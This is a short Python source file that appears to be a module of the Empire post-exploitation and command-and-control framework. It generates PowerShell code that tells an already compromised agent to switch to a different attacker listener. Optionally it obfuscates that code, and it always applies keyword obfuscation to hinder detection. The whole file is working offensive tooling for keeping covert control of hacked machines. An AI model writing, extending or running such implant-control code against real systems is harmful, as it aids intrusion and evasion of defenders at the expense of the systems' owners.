from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # extract all of our options
        listener_name = params['Listener']

        if listener_name not in main_menu.listeners.activeListeners:
            print(helpers.color("[!] Listener '%s' doesn't exist!" % (listener_name)))
            return ''

        active_listener = main_menu.listeners.activeListeners[listener_name]
        listener_options = active_listener['options']

        script = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_comms(listenerOptions=listener_options, language='powershell')

        # signal the existing listener that we're switching listeners, and the new comms code
        script = "Send-Message -Packets $(Encode-Packet -Type 130 -Data '%s');\n%s" % (listener_name, script)

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = helpers.keyword_obfuscation(script)

        return script
